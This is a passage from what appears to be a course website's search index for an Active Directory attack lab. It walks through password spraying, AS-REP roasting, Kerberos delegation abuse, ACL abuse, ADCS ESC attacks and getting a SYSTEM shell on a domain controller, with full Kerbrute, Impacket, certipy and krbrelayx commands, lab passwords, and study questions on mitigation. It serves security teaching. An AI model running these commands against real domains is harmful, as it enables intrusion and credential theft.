environment and no GUIs</li> <li>One for the multi-domain environment with GUIs</li> <li>One for the single-domain environment with GUIs</li> <li>And one for the single-domain environment without GUIs</li> </ul> <p>Choose the one you wish to use, which in this case, must be a dir referring to the multi-domain environment. Pick the one that uses GUIs or not, depending on your choice.</p> <p>Once in the dir, run: <pre><code>ansible-playbook create_lab.yml\n</code></pre></p> <p>And now, Orchestrator will use an Ansible script to configure the lab's machines (KING, CHIEF,CAPTAIN, MEMBER, and Attacker). This will take some time. Once the script finishes without errors, the environmnet is ready. Have fun.</p> <p>AUTOMATION REMARKS</p> <p>When machines are deployed in the lab, they are given a random IP address from the 192.168.122.0/24. These addresses can sometimes cause a conflict in automation. For example, the MEMBER machine has the 192.168.122.2 IP address given by DHCP set in the NAT node from GNS3. Then, the Ansible script will set 192.168.122.2 to the Attacker machine, and once it tries to connect to the MEMBER at the same IP, the connection can fail.</p> <p>In these cases, if you have some Ansible errors related with connections, that might be the culprit. If you find yourself in this situation, my suggestion is to delete the current project, execute the Python script again, and run Ansible. Most of the times you won't get this problem, but it can happen.</p>"},{"location":"labs/multi-domain-attacks/password-spraying-rv/","title":"Password Spraying","text":"<p>Once you know a few usernames, you can start guessing their passwords. The file valid_users.txt, available in the course materials folder, lists the valid users found in the previous exercise. While performing a Wireshark capture, run the following command to check if any valid user has the password: \"Password123\". <pre><code>./kerbrute passwordspray -d polaris.local valid_users.txt --dc 192.168.122.10 Password123\n</code></pre></p> <p>You can also try to guess multiple passwords using Kerbrute. In this case, you'll have to create a file with multiple passwords. These passwords will then be sprayed against the valid user names, from the valid_users.txt. You can use the existing passwords.txt file.</p> <pre><code>./kerbrute passwordspray -d polaris.local valid_users.txt --dc 192.168.122.10 passwords.txt\n</code></pre> <p>Question</p> <p>Explain the process of password spraying performed by kerbrute, using a Wireshark capture.</p> <p>Question</p> <p>Is there any advantage in password spraying a group of known user names, when compared to bruteforcing the password of a single user account? Why?</p> Is there any advantage in password spraying a group of known user names, when compared to bruteforcing the password of a single user account? Why? <p> Submit <p></p></p>"},{"location":"labs/multi-domain-attacks/password-spraying/","title":"Password spraying","text":"<p>Once an attacker has uncovered some valid usernames from domains through user enumeration or anonymous SAMR enumeration attacks, they can shift their focus into uncovering passwords.</p> <p>One way of doing so is through a Password Spraying attack, in which a single password is attempted using different valid usernames, a technique useful for preventing account lockouts when compared with traditional bruteforce attacks. To execute this attack on the different domains, you can make use of the following files: north_users.txt, containing the north's domain users, altair_users.txt for altair domain's users, and sirius_users.txt for sirius. Using these files you may execute password spray attacks using the Kerbrute tool:</p> <pre><code>./kerbrute passwordspray -d north.altair.local north_users.txt --dc 192.168.122.10 Password123\n./kerbrute passwordspray -d altair.local altair_users.txt --dc 192.168.122.20 ThisIsMyPassword123\n./kerbrute passwordspray -d sirius.local sirius_users.txt --dc 192.168.122.30 IDontKnow?\n</code></pre> <p>By having valid usernames and trying common passwords, an attacker may gather credentials to access the domain as an authenticated user. This way, the attacker has retrieved 3 user accounts, one for each domain in our environment.</p> <p>Question</p> <p>How does this attack prevent account lockout when compared with traditional bruteforce attacks?</p> Answer <p>This attack prevents account lockouts when compared to traditional bruteforce attacks because it targets many user accounts with a single password per attempt, instead of trying many passwords on one user. In traditional bruteforce, repeatedly guessing passwords for the same account quickly triggers lockouts. In contrast, password spraying spreads login attempts across users, which avoids triggering lockout policies while still allowing the attacker to find weak passwords and gain access.</p>"},{"location":"labs/multi-domain-attacks/unconstrained-delegation-abuse/","title":"Unconstrained delegation abuse","text":"<p>This attack is performed by using a compromised service account that is configured to perform unconstrained delegation. Once an attacker has compromised any user account, it can query the domain's database using LDAP, in order to check which accounts are configured for delegation. This can be done by using the 'findDelegation.py' script from Impacket. You may use Jesse Pinkman's credentials, cracked in the AS-REP roasting attack.  </p> <pre><code>findDelegation.py NORTH.ALTAIR.LOCAL/jesse.pinkman:Wang0Tang0! -target-domain north.altair.local\n</code></pre> <p>The output from the script tells the attacker which accounts are configured for which type of delegation. Namely, the attacker notes that the jesse.pinkman account is configured for unconstrained delegation. This means that through the use of this account, the attacker can retrieve TGTs from users that authenticate to it.</p> <p>Now, the objective in this exercise is to steal the DC account's TGT. The DC account can be coerced into authenticating to the attacker's machine through the use of the Printer Bug. If the DC authenticates to the attacker machine, the attacker can then retrieve its TGT, and impersonate the DC to any service on the domain.</p> <p>To properly trigger the Printer Bug and coerce the DC to authenticate to the attacker using Kerberos, there must be a DNS record that resolves the jesse.pinkman.north.altair.local hostname to the attacker's IP address. This is required since if IP addresses are used to trigger authentication, Windows falls back to NTLM. To create this record, the 'dnstool.py' script from the krbrelayx toolkit can be used, since authenticated users can create  DNS records. In the 'krbrelayx' directory, run:</p> <pre><code>python3 dnstool.py -u north\\\\jesse.pinkman -p 'Wang0Tang0!' captain.north.altair.local --zone north.altair.local -r jesse.pinkman.north.altair.local -a add -t A -d 192.168.122.2\n</code></pre> <p>At this point, there's a DNS record resolving Jesse's hostname to the attacker's IP address. Upon DC authentication to Jesse, the DC will query DNS and be tricked into thinking that the attacker's IP is actually Jesse's IP.</p> <p>At this point, the printer bug can be executed, which will trigger Kerberos authentication from the DC to the attacker. Since the DC assesses that Jesse is configured for unconstrained delegation, it will include its own TGT within the AP-REQ sent to the attacker's machine. The attacker will then use Jesse's password to decrypt the AP-REQ section that includes a session key. This session key is necessary to use the TGT, and will also be sent to Jesse, as per unconstrained delegation behavior. Once this session key is obtained, the attacker can then use the DC's TGT arbitrarily.</p> <p>To do so, in one terminal, the 'krbrelayx.py' script must be running. Once that script is running and waiting for the DC to authenticate to the attacker, the attacker will execute the printer bug in a second terminal, using the 'printerbug.py' script. The Printer Bug will coerce the DC to authenticate to the attacker's machine.</p> <pre><code>#In a first terminal, run the krbrelayx.py script. To be able to do so, you must stop the DNS service running on your machine\n#First, stop DNS service\nsystemctl stop systemd-resolved \n#Now, run the krbrelayx script\nsudo -E python3 krbrelayx.py -s jesse.pinkman -p Wang0Tang0!\n#Now in a second terminal, run the printer bug in order to trick the DC into authenticating to the attacker using Kerberos\npython3 printerbug.py NORTH/jesse.pinkman:'Wang0Tang0!'@captain.north.altair.local jesse.pinkman.north.altair.local\n#At this point you can restart the DNS service\nsystemctl start systemd-resolved \n</code></pre> <p>At this point, the attacker has successfully retrieved the CAPTAIN DCs own TGT, which can be used to impersonate the DC to any service in the domain.</p> <p>Question</p> <p>Why is the service's (Jesse's) password required to retrieve the DC's TGT? </p> Answer <p>The service password is required since in Kerberos Unconstrained Delegation, the DC's TGT is sent to the attacker, along with a session key. This session key is encrypted using the service account's (Jesse) password. Using Jesse's password, the attacker can retrieve this session key and use it in new TGS exchanges, leveraging the own DC's TGT, and therefore impersonating the DC. </p> <p>Question</p> <p>Would the DC send its TGT to the attacker if constrained delegation was used, instead of unconstrained delegation?</p> Answer <p>The DC would not send its TGT if instead constrained delegation was used. This only happens in unconstrained delegation and is considered unsecure.</p> <p>Question</p> <p>Which Windows service is exploited by the Printer Bug to trigger authentication from a target system?</p> Answer <p>The Printer Bug abuses the Windows Print Spooler service to coerce a target to authenticate to the attacker.</p>"},{"location":"labs/multi-domain-attacks/user-enumeration-rv/","title":"User enumeration","text":"<p>This exercise resorts to kerbrute and a list of popular usernames, to obtain the usernames configured at the DC (valid usernames). Use the users.txt file stored in the course materials folder as the list of popular usernames. Run the following command while performing a Wireshark capture at the attacker\u2019s interface: <pre><code>./kerbrute userenum -d polaris.local users.txt --dc 192.168.122.10\n</code></pre> You may use a kerberos filter to analyze the Wireshark capture.</p> <p>Question</p> <p>Explain the user enumeration process, using a Wireshark capture.</p> Answer <p>The attacker sent nine AS-REQ messages over UDP, since there are nine usernames in the users.txt file. Received five PRINCIPAL UNKNOWN error messages, three PREAUTH REQUIRED, and one RESPONSE_TOO_BIG. The latter is due to user angela.moss with does not require pre-authentication. In this case, a TCP connection is established with the AD, the AS-REQ is sent again, and an AS-REP is received. The AS-REP message carries the username of the requesting user. The correlation between requests and responses in the UDP messages is done through the port number. </p> <p>Question</p> <p>How does kerbrute correlate the requests with the responses?</p> <p>Question</p> <p>What is the behavior in case of users not requiring pre-authentication?</p>"},{"location":"labs/multi-domain-attacks/user-enumeration/","title":"User enumeration","text":"<p>At this point, we've uncovered north.altair.local's user accounts, but not sirius.local's nor altair.local's, since these domains do not allow anonymous user enumeration. To guess these domain's user accounts, the attacker can execute the User Enumeration attack.</p> <p>This exercise resorts to the Kerbrute tool and a list of popular usernames to obtain the usernames configured at the DCs (valid usernames). Use the potential_users.txt as the list of popular usernames. Run the following commands while performing a Wireshark capture at the attacker\u2019s interface: <pre><code>./kerbrute userenum -d altair.local potential_users.txt --dc 192.168.122.20\n./kerbrute userenum -d sirius.local potential_users.txt --dc 192.168.122.30\n</code></pre></p> <p>It seems that we've uncovered 3 users in each of these domains. Nice! Other usernames seem to not have been found, which doesn't mean there are no more users. It means that we couldn't guess them...</p> <p>You may use a kerberos filter to analyze the Wireshark capture.</p> <p>Question</p> <p>Explain the user enumeration process, using a Wireshark capture.</p> Answer <p>The attacker sent AS-REQ messages over UDP, since there are nine usernames in the users.txt file. Received five PRINCIPAL UNKNOWN error messages, three PREAUTH REQUIRED, and one RESPONSE_TOO_BIG. The latter is due to user angela.moss with does not require pre-authentication. In this case, a TCP connection is established with the AD, the AS-REQ is sent again, and an AS-REP is received. The AS-REP message carries the username of the requesting user. The correlation between requests and responses in the UDP messages is done through the port number. </p> <p>Question</p> <p>How does kerbrute correlate the requests with the responses?</p> Answer <p>Kerbrute correlates each AS-REP response to its username by sending one request per UDP source port, allowing it to match replies based on the unique port used per query.</p>"},{"location":"labs/single-domain-attacks/ACLAbuse/","title":"ACLs","text":"<p>WAD uses ACLs in what are called object's Security Descriptors in order to define object access. These ACLs hold information on which Security Principals have what type of access to the object in question. ACLs can be exploited by attackers. For example, imagine that the attacker compromises an account A, and this account A holds determined access rights to an object B. This way, if access rights are powerful enough, the attacker may also compromise object B using account A. This is the basic principle of ACL attacks. Now, let's get to concrete examples.</p> <p>We've previously gathered information and uploaded it to BloodHound on the BloodHound section. Let's query our information for ACL paths, to get a better look at what can be done. Use the following Cypher query: <pre><code>MATCH p=(u)-[r1]-&gt;(n)\nWHERE r1.isacl = true\n  AND u.admincount = false\n  AND NOT toLower(u.name) CONTAINS 'key'\n  AND toLower(u.domain) = \"polaris.local\"\n  AND NOT toLower(u.name) CONTAINS 'ras and ias servers'\n  AND NOT toLower(n.name) CONTAINS 'ras and ias servers'\n  AND NOT toLower(u.name) CONTAINS 'samaccountname'\n  AND NOT toLower(n.name) CONTAINS 'samaccountname'\n  AND NOT toLower(u.name) CONTAINS 'enterprise'\nRETURN p\n</code></pre></p> <p>This shows us different nodes and links. These nodes are our Security Principals, and the links between them represent different access rights, defined by ACLs. Through the BloodHound GUI we can determine that there's a path from the Skyler White user, all the way to the CAPTAIN machine! First, we notice that Skyler has a 'ForceChangePassword' link to Jesse. This indicates that Skyler can change Jesse's password! Since we've compromised Skyler's account earlier, we can now compromise Jesse's by changing it's current password: <pre><code>net rpc password jesse.pinkman -U polaris.local/skyler.white%Password123 -S captain.polaris.local\n#introduce the password, for example ThisIsANewPassword10\n#now confirm if the password was correctly altered\ncrackmapexec smb 192.168.122.10 -u jesse.pinkman -d polaris.local -p ThisIsANewPassword10\n</code></pre> From jesse\u2019s account, we can compromise walter.white\u2019s account, since jesse holds the 'GenericWrite' access right over it. This means that Jesse can alter Walter's attributes. This allows for the Shadow Credentials attack, seen in our ADCS section. We can therefore  retrieve Walter's hashes and a TGT in his name through this attack, as Jesse. <pre><code>certipy shadow auto -u jesse.pinkman@polaris.local -p ThisIsANewPassword10 -account 'walter.white'\n</code></pre></p> <p>And we've compromised Walter's account! Let's see what we can do from here. It seems Walter has the ability of modifying Hank's own ACL! This means the attacker, as Walter, can give itself other types of access to Hank, such as 'FullControl' access! Then, we can perform the Shadow Credentials attack once more, as 'FullControl' access gives Walter (yes, you've guessed it) full control over Hank's user account! One can also change Hank's password as we've done before.</p> <pre><code>#we can check walter's current rights on hank, please use set the KRB5CCNAME env var to the .ccache file retrieved in the last step\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'read' -principal walter.white -target 'hank.schrader' 'polaris.local'/'walter.white'\n#add FullControl right to walter\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'write' -rights 'FullControl' -principal walter.white  -target 'hank.schrader' 'polaris.local'/'walter.white'\n#we can check walter's new access rights on hank's account\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'read' -principal walter.white -target 'hank.schrader' 'polaris.local'/'walter.white'\n#you can use the shadow credentials attack once again, this time using walter's account and targeting hank's\ncertipy shadow auto -u walter.white@polaris.local -hashes :&lt;NT hash from previous attack&gt; -account 'hank.schrader'\n</code></pre> <p>Once you've compromised Hank's account, you can use it to add members to the 'Masters' security group! It seems that this group has 'GenericAll' access rights over the DC!</p> <p><pre><code>#Using Hank's credentials, add skyler.white to the Masters group\nldeep ldap -u hank.schrader -H ':&lt;NT hash from previous attack&gt;' -d polaris.local -s ldap://192.168.122.10 add_to_group \"CN=Skyler White,CN=Users,DC=polaris,DC=local\" \"CN=Masters,CN=Users,DC=polaris,DC=local\"\n\n#Confirm that skyler is now part of the masters group\nldeep ldap -u hank.schrader -H ':&lt;NT hash from previous attack&gt;' -d polaris.local -s ldap://192.168.122.10 membersof 'Masters'\n</code></pre> Now, all thanks to misconfigured ACLs with over-permissive access rights granted to low-privileged accounts,  the attacker can compromise the domain: <pre><code>certipy shadow auto -u skyler.white@polaris.local -p 'Password123' -account 'captain$'\n#now you can use the secretsdump.py script with either the hashes or the TGT received from the shadow credentials attack\n</code></pre></p> <p>Question</p> <p>How could these permissions have been configured more securely to prevent privilege escalation through ACLs?</p> Answer <p>Permissions should follow the principle of least privilege. Only the minimum rights necessary should be granted. For example, avoiding giving low-privileged accounts rights like ForceChangePassword, GenericWrite, or GenericAll over higher-privileged accounts.</p> <p>Question</p> <p>What would be the real impact on the organization if an attacker exploited this ACL chain up to the Domain Controller?</p> Answer <p>Full compromise of the DC effectively gives the attacker control over the entire Active Directory domain. This means the ability to impersonate any user, maintain persistent access, and more. Essentially, this is game over for the organization\u2019s AD domain.</p> <p>Question</p> <p>Is the BloodHound tool only helpful for attackers in this scenario?</p> Answer <p>No. BloodHound is valuable for both attackers and defenders. While attackers can use it to map privilege escalation paths and exploit misconfigurations, defenders can leverage it to audit AD environments, identify excessive permissions, and remediate risky ACLs before they are abused. When integrated into security audits, BloodHound becomes a powerful defensive tool.</p>"},{"location":"labs/single-domain-attacks/AD-Reconnaissance/","title":"Anonymous AD Reconnaissance","text":"<p>Once different machines and services are identified, the attacker may then begin reconnaissance of AD information. Information such as different users and accessible shares. Sometimes, this information is available to unauthenticated users, and thus without any valid credentials, an attacker may potentially access it.</p> <p>First, let's try to anonymously enumerate AD users from the polaris.local domain: <pre><code>crackmapexec smb 192.168.122.10 --users\n</code></pre> It seems that the CAPTAIN DC allows its users to be anonymously enumerated. This gives the attacker a great advantage. It also seems that one of the user's has his password in the description. Just like this, the attacker has gained an initial foothold on the domain.</p> <p>Domain Controller's by default do not allow Anonymous SAMR enumeration. In that case, attackers must resort to attacks such as User Enumeration to uncover valid user accounts in AD domains.</p> <p>Another thing that the attacker can do without credentials is listing shares. In AD there's a 'Guest' account, often without password and with very limited privileges. One of those privileges normally is the possibility to enumerate shares. Who knows, maybe the Guest account can even access one or two.</p> <p><pre><code>crackmapexec smb 192.168.122.10 -u 'a' -p '' --shares\n</code></pre> Using the Guest account, we can see the different shares available in CAPTAIN. We even have access to one of them! Let's take a look:</p> <p><pre><code>smbclient //192.168.122.10/SharingIsCaring -U guest\n#Press 'ENTER' when the password is requested\nls \nget skyler.txt\nexit\ncat skyler.txt\n</code></pre> Seems like Skyler's not very good with passwords. Maybe we can guess it down the road?</p> <p>Question</p> <p>How many File Shares are available in CAPTAIN?</p> Answer <p>There are seven file shares in CAPTAIN. The guest account can read and write one of them: SharingIsCaring.</p> <p>Question</p> <p>How many users are there in the polaris.local domain? Which one has left their password on the description?</p> Answer <p>Through anonymous enumeration, the attacker found 7 user accounts. The saul.goodman user account's password can be seen in its description.</p>"},{"location":"labs/single-domain-attacks/ADCSExploiting/","title":"ADCS Exploiting","text":"<p>Active Directory Certificate Services is Microsoft's Public Key Infrastructure implementation for Active Directory environments. It allows organizations to issue, manage, and validate various digital certificates. These certificates can be used for user/computer logon, email/file encryption, signing, and Kerberos authentication.</p> <p>ADCS misconfigurations may lead to possible attack vectors, as we'll see in this section. ADCS related attacks are also named ESC (Enterprise Security Configuration) attacks. There are many ESC attacks. This section will only illustrate some of these.</p> <p>As a first step to attack AD through the Certificate Services, an attacker should first assess ADCS information, such as the CA (Certificate Authority) name, as well as the templates issued by the CA, in order to look for some vulnerable templates and CA configurations. To do so, the certipy tool may be used:</p> <p><pre><code>certipy find -u skyler.white@polaris.local -p 'Password123' -vulnerable -dc-ip 192.168.122.10 -stdout\n</code></pre> This will output various information to stdout. We can see that the CA is called Polaris Root CA, and that it is vulnerable to ESC1-4 and ESC8 attacks.</p> <p>The ESC8 attack is possible since the CA allows web enrollment. This means that users are allowed to request certificates by authenticating through the network. As we've explored on other attacks, we can relay NTLM authentication from a client to a server and impersonate the client against the legitimate server. In this case, let's relay NTLM messages from the DC itself to the CA (which is being hosted by MEMBER), and this way, retrieve a certificate as the DC itself. The certificate can then be used to obtain a TGT issued for the DC account. This allows the attacker to impersonate the DC through its TGT. <pre><code>#start the relay in terminal 1\ncertipy relay -target 192.168.122.5 -ca 192.168.122.5 -template DomainController \n#trigger NTLM dc authentication from terminal 2\npython3 printerbug.py POLARIS/skyler.white:Password123@192.168.122.10 192.168.122.2 \n#now, you should have acquired a certificate through the certipy script. use it to get a TGT as the DC\ncertipy auth -pfx captain.pfx -dc-ip 192.168.122.10\n</code></pre></p> <p>ESC1-4 are related to misconfigured templates, rather than a misconfigured CA. On an ESC1 attack, an attacker takes advantage of the fact that there's a template that allows the enrollee to supply a SubjectAltName (SAN). This SAN identifies to whom this certificate is being issued to. It basically allows the attacker to say \"Hey, I'm asking for this certificate, but it's actually for the administrator, not me. So go ahead and issue a certificate on the administrator's behalf, I'll take care of the rest.\". Since the template allows the attacker to supply a SAN, the CA issues this certificate in the administrator's name and sends it to the attacker.</p> <pre><code>#retrieve the certificate\ncertipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC1 -ca 'Polaris Root CA' -upn administrator@polaris.local\n#now use the certificate to authenticate as the administrator\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 \n</code></pre> <p>When it comes to ESC2 and ESC3 templates, these are configured with the 'Any Purpose' EKU and 'Certificate Request Agent' EKUs, respectively. EKU stands for Extended Key Usage, and it determines the uses that a template has. These two EKUs allow a user to use the certificates to request other certificates in name of other users. Having these EKUs set on certificate to which low-privilege users can enroll open ways for ESC2(Any Purpose EKU) and ESC3(Certificate Request Agent EKU) attacks:</p> <pre><code>#request the certificate template with over permissive EKUs. can be either ESC2 or ESC3\ncertipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC2 -ca 'Polaris Root CA'\n#use the certificate to request another certificate on behalf of another user\ncertipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template User -ca 'Polaris Root CA' -on-behalf-of 'polaris\\administrator' -pfx skyler.white.pfx\n#retrieve a tgt for the administrator user\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10\n</code></pre> <p>Finally, the ESC4 attack is possible when the attacker has compromised an account that holds write permissions over a certificate template. By being able to modify a certificate template, the attacker can alter its configuration, and for example, allow the enrollee to supply a SAN (ESC1 attack):</p> <pre><code>#Modify the ESC4 certificate template to allow SANs in the request while saving the old certificate template\ncertipy template -u skyler.white@polaris.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -save-old\n#get a certificate for impersonating the administrator through the ESC1 attack, which the ESC4 template is now vulnerable to\ncertipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC4 -ca 'Polaris Root CA' -upn administrator@polaris.local\n#get a tgt using the template\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 \n#modify the template once again, setting it back to its old configuration\ncertipy template -u skyler.white@polaris.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -configuration ESC4.json\n</code></pre> <p>Question</p> <p>How can an administrator prevent ESC8 attacks?</p> Answer <p>The admins can prevent these attacks by disabling CA web enrollment, or by mitigating relay attacks themselves, through enabling SMB signing on CA servers, which would also prevent this attack.</p> <p>Question</p> <p>How does ESC1 lead to impersonation of any user, including Domain Admins?</p> Answer <p>In an ESC1 attack, the certificate template is misconfigured to allow the enrollee to specify the Subject Alternative Name (SAN). Since the SAN defines the identity the certificate represents, an attacker can simply request a certificate where the SAN is set to a privileged account, like Administrator. The CA issues the certificate without verifying ownership, giving the attacker valid credentials to impersonate that account.</p> <p>Question</p> <p>What's the difference between ESC2 and ESC3 attacks?</p> Answer <p>The Extended Key Usage values are different. In ESC2, the template has an 'Any Purpose' EKU, which means the certificate can be used for anything, while ESC3 has the 'Certificate Request Agent' EKU which is more granular, but still the EKU that allows to perpetrate these attacks.</p>"},{"location":"labs/single-domain-attacks/AS-REPRoasting/","title":"AS_REP Roasting","text":"<p>This attack targets user accounts that are configured to not use pre-authentication in Kerberos authentication. The first step in Kerberos is to retrieve a TGT on the user's behalf. To do so, normally, user's must pre-authenticate themselves. This pre-authentication step proves the user has knowledge of its own password, and allows the user to retrieve a TGT.</p> <p>When pre-authentication isn't required for some user, they do not need to provide their password to retrieve a TGT. Thus, an attacker without password knowledge can retrieve TGTs for users with no pre-authentication required. </p> <p>The TGT is only usable if the user has password knowledge. The AS-REP message sent to the user contains both a TGT and an encrypted section. The latter section is encrypted using the user's password. Thus, the attacker's objective isn't simply retrieving the TGT (the attacker doesn't know the password so they can't use it), but instead, discover the user's password through offline cracking of the AS-REP encrypted section.</p> <p>Once the attacker retrieves the AS-REP message, it can use a list of common passwords to attempt and decrypt the password-encrypted section. If some password is able to decrypt this section, it means that the password belongs to the user to whom the AS-REP was issued.</p> <p>To execute this attack, use the polaris_users2.txt file, and run the Impacket script:</p> <pre><code>GetNPUsers.py polaris.local/ -no-pass -usersfile polaris_users2.txt -outputfile asrep.hash\n</code></pre> <p>It seems that we were able to retrieve an AS-REP for Jesse, as Jesse does not require Kerberos' pre-authentication. Now we can attempt to crack its password-encrypted section offline using hashcat. Hashcat and GNS3 VMs don't get along very well. My suggestion is to install Hashcat on your own machine, retrieve the cipher text from asrep.hash file, as well as the passwords.txt file, and execute the following command:</p> <pre><code>hashcat -m 18200 asrep.hash passwords.txt -o cracked1.txt --force --quiet\n</code></pre> <p>You should be able to retrieve Jesse's password this way.</p> <p>Question</p> <p>What message does an attacker receive when they send an AS-REQ without pre-authentication to a user that does not require pre-authentication? What does an attacker receive in the case the user does require pre-authentication?</p> Answer <p>In case the user does not require pre-auth: an AS-REP message containing the user's TGT. If otherwise the user requires pre-auth: a Kerberos error message (KRB5KDC_ERR_PREAUTH_REQUIRED).</p> <p>Question</p> <p>Can the attacker use the user's TGT right away? Why?</p> Answer <p>No. In order to use the TGT, the attacker must have access to a session key that is sent in the AS-REP message. This session key is in turn encrypted using a user's password derived key, which the attacker has no access to. Therefore the attacker cannot use the TGT.</p> <p>Question</p> <p>How does the attacker know if they have successfully cracked the password?</p> Answer <p>The attacker knows the password is correct due to the TGT having recognizable fields including the realm name, timestamp, and client principal name. When the correct key (derived from the cracked password) is used to decipher the TGT, these fields are properly parsed, confirming the password is valid. Hashcat's job is to derive the key from a potential password, try decrypting the AS-REP encrypted section, and assess if there are recognizable fields. If there are, the password used to derive the key is the user's password.</p> <p>Question</p> <p>Does the attacker need credentials to perpetrate this attack?</p> Answer <p>Yes, the attacker needs to know valid usernames in order to perpetrate this attack. However, the attacker does not need to know passwords, which are part of the credentials.</p>"},{"location":"labs/single-domain-attacks/BloodHound/","title":"BloodHound","text":"<p>BloodHound is a very important tool in AD pentesting, both from an offensive as well as a defensive point of view. In this section, we'll go through setting it up and using it.</p> <p>First, you'll have BH's configuration in /home/ubuntu/.config/bloodhound. There, you'll have the 'docker-compose.yml' file which defines the containers and service needed to run BH via Docker (which we're doing). In this dir you can dispose the containers, or start them (you probably don't have to unless you've restarted the attacker machine):</p> <pre><code>#in /home/ubuntu/.config/bloodhound/\n#command to dispose of the docker containers\ndocker-compose down -v\n#command to set up the required containers to run BH\ndocker-compose up -d\n</code></pre> <p>Once containers have started, you can access them through HTTP from your host machine. Doing so in Linux is easier, but it is also possible in Windows, as long as you can communicate through the network from your host machine to the Attacker VM running in GNS3. To access the BH GUI, once you can communicate with the 'Attacker' GNS3 VM, just use your browser and access \"http://192.168.122.2:8080/ui/login\". If you cannot connect straight away, wait for a while and hit refresh. </p> <p>In this page, you'll authenticate as the 'admin' user. You'll need a password though. To retrieve the password and login as admin do the following: <pre><code>#in /home/ubuntu/bloodhound-install/\n./bloodhound-cli config get default_password\n#take note of the password\n</code></pre></p> <p>You'll have to reset the password. Pick your favourite. At this point you should have logged in BH. You should be presented a warning telling you that there's no data uploaded yet. Let's take care of that.</p> <p>To do so, we'll use the 'bloodhound.py' ingestor. This script uses valid user credentials to query the domain using LDAP and retrieve JSON files ready to be uploaded to BH. Let's get to it:</p> <p><pre><code>#in /home/ubuntu/BloodHoundIngestor/\npython3 bloodhound.py --zip -c All -d polaris.local -u skyler.white -p Password123 -dc captain.polaris.local \n</code></pre> This command will produce a .zip file containing JSON files with AD information ready to be uploaded to BH. Let's upload them:</p> <pre><code>mkdir /home/ubuntu/BHCEupload/bhfiles\nmv /home/ubuntu/BloodHoundIngestor/*.zip /home/ubuntu/BHCEupload/bhfiles\ncd /home/ubuntu/BHCEupload/\n</code></pre> <p>In your current directory, there's a Golang tool used to upload these files to BH. In order to use it you need to do the following: Access BH's GUI and navigate to the \"Profile\" tab, on the left. Then click \"API Key Management\", followed by \"Create Token\". Give it a name, click \"Save\" and take note of both the Key and ID values presented to you before closing this window.</p> <p>Now, to upload the files: <pre><code>#in /home/ubuntu/BHCEupload/\n./BHCEupload -tokenid &lt;token-ID&gt; -tokenkey &lt;token-key&gt; -dir ./bhfiles/ -url http://192.168.122.2:8080\n</code></pre></p> <p>At this point, the data retrieved using 'bloodhound.py' was uploaded and can now be accessed through the GUI. It may take a while for the data to be accessible through the GUI. You can head back to the \"Explore\" tab using the left panel, and navigate through information using BloodHound!</p> <p>To start you off, you can use the following Cypher queries: <pre><code>#presents the different domains and domain joined machines\nMATCH p = (d:Domain)-[r:Contains*1..]-&gt;(n:Computer) RETURN p\n#presents the different domains and respective user accounts\nMATCH p = (d:Domain)-[r:Contains*1..]-&gt;(n:User) RETURN p\n#presents the overall map of domains, groups and users\nMATCH q=(d:Domain)-[r:Contains*1..]-&gt;(n:Group)&lt;-[s:MemberOf]-(u:User) RETURN q\n</code></pre> The BloodHound tool will aid us in further attacks, such as ACL and GPO abuse.</p>"},{"location":"labs/single-domain-attacks/ConstrainedDelegationAbuse/","title":"Constrained Delegation Abuse","text":"<p>Misconfigured constrained delegation rights may lead to domain compromise. This abuse doesn't necessarily take advantage of a vulnerability or a bug, but rather from misconfigurations. The attacker simply takes advantage of them.</p> <p>Upon acquiring valid user credentials, an attacker may look for delegation rights configured in a domain. This way, an attacker can target valuable accounts, such as accounts that are configured for constrained delegations for sensitive services, such as the SMB/CIFS service running on a domain controller.</p> <p>The attacker can look for configured delegation rights by using Impacket's 'findDelegation.py' script: <pre><code>findDelegation.py POLARIS.LOCAL/skyler.white:Password123 -target-domain polaris.local\n</code></pre> The output of this script shows us that Walter is configured for constrained delegation, being able to delegate tickets to the SMB service running on the domain controller! This means that if the attacker can compromise Walter's account, they can impersonate the administrator account and access this service as the administrator! This is possible thanks to the S4U2Self and S4U2Proxy protocol extensions used in Kerberos' constrained delegation.</p> <p>In the Kerberoasting section of the lab we've targeted Walter's account, and cracked his password using Hashcat (hopefully). If you haven't been able to crack Walter's password, I'll let you in on it: 'Metho1o590oA$elry'.</p> <p>Since we've compromised Walter's account, we can now take advantage of this misconfiguration where a low-privileged account has delegation rights to a sensitive service: <pre><code>#retrieve a ticket for the CIFS service in the domain controller as the admin through S4U2Self and S4U2Proxy\ngetST.py -spn 'CIFS/captain.polaris.local' -impersonate Administrator -dc-ip '192.168.122.10' 'polaris.local/walter.white:Metho1o590oA$elry'\n#set the krb5ccname environment var to the new ccache file\nexport KRB5CCNAME=/home/ubuntu/Administrator.ccache\n#use the ticket to access the domain controller through a shell as the administrator through the SMB protocol\npsexec.py  -k -no-pass POLARIS.LOCAL/Administrator@captain.polaris.local\n</code></pre></p> <p>And just like that we can issue commands in the DC as SYSTEM by leveraging a TGS issued on the Administrator behalf! By abusing a misconfigured delegation right, a low-privileged user escalated directly to Domain Admin, without needing to exploit any vulnerability.</p> <p>Question</p> <p>What's S4U2Self and S4U2Proxy role in this attack?</p> Answer <p>The attacker, using Walter's account, can use the S4U2Self extension in order to request a service ticket to its own service, on behalf of the Administrator. By having a ticket from the Administrator to its own service, Walter can then use the S4U2Proxy extension, which retrieves a service ticket in name of the Administrator (in this case) for the CIFS service in CAPTAIN, and use this ticket, impersonating the Administrator while accessing the CIFS service in CAPTAIN. All of this is possible since Walter is allowed to perform constrained delegation to the CIFS service in CAPTAIN.</p> <p>Question</p> <p>How can this attack be mitigated?</p> Answer <p>This attack can be mitigated by not configuring constrained delegation permissions from low-privileged accounts to sensitive services. This way, simply by compromising user accounts, an attacker shouldn't be able to access a service as the administrator. Delegation to sensitive services needs to be carefully planned and accounts that can delegate tickets 